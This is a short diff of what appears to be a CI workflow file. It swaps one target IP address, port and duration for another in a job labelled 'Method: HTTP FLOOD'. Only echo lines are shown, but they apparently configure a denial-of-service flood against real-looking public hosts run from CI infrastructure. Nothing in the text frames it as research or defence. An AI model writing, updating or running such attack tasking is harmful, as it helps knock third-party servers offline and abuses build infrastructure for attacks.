@@ -10,7 +10,7 @@ jobs:
     steps:
       - name: Run
         run: |
-          echo "IP: 20.198.111.131"
-          echo "Port: 19960"
-          echo "Duration: 300"
+          echo "IP: 52.172.103.71"
+          echo "Port: 17869"
+          echo "Duration: 120"
           echo "Method: HTTP FLOOD"
